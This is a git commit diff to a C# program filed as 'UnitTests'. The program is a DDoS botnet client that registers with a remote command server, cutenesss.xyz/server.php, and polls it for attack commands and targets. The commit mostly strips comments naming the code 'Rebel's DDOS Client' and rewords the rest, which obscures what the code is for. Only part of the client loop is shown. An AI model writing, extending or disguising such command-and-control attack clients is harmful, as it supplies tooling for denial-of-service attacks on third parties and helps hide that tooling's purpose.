5be1305b874c6db167c02b80778e4ee59ef5c540
EvolveAir <samuellbrown1@gmail.com>
2018-02-05 11:38:36 +0000

    Cleared up comments

--- UnitTests/UnitTests/Program.cs
+++ UnitTests/UnitTests/Program.cs
@@ -7,25 +7,18 @@ namespace UnitTests
     {
         static void Main(string[] args)
         {
-            //Direct location of your server.php file.
-            //This is mine, however i doubt ill actually have a target for you to attack. Use it as a test for the client. Most of the variables are the same. Use the default hash secret provided below.
+            // Setting server adress
             string ServerAddress = "http://cutenesss.xyz/server.php";
 
-            //Proper Credit. This may be moved to another location, or it can be remade. Just keep the main idea.
-            //Log("This software is based on DDOS by rebelb0y11. rebel.hgtti.com AND github.com/rebelb0y11/DDOS");
-
-            //Log("Initializing Rebel's DDOS Client.");
             WebClient client = new WebClient();
 
-            //Log("Starting the RunLoop. While running, Log Messages will be left to a minimal.");
-            string Secret = "Rebelb0y11"; //A string to use as the version ID. My name is default. Use it for testing the client by my server.
-            //string Hash = GetSha1(Secret).ToLower();
+            string Secret = "<3"; //A string to use as the version ID. Use it for testing the client.
+            
 
-            //Log("The hash for this version is " + Hash);
-            //Log("In future versions, this hash will be secret and enforced, to ensure that everyone is running the newest version.");
+            //In future versions, this hash will be secret and enforced - Makes sure everyone is running latest client
             int GetIterations = -1;
             string target = "";
-            bool Loop = true; //I could break the loop, but id like to let the code finish.
+            bool Loop = true; // So we can break the loop
             Console.WriteLine("Set varibles - No errors");
             while (Loop)
             {
@@ -44,7 +37,7 @@ namespace UnitTests
                     //(Will probably be implemented in a newer version)
                     if (GetIterations == -1)
                     {
-                        //Log("Telling the server this is a new client");
+                        //Telling the server this is a new client
                         if (paramaters == "?")
                             paramaters = paramaters + "newclient=true";
                         else
@@ -65,7 +58,7 @@ namespace UnitTests
                     else
                         paramaters = paramaters + "&hash=" + Hash;
                         */
-                    //Tells the server the client hash of this version. This will be used to protect the server from clients impersonating my own. Currently serves no real purpose.
+                    //Tells the server the client hash of this version. This will be used to protect the server from clients impersonating.
 
                     string commands = "";
                     try
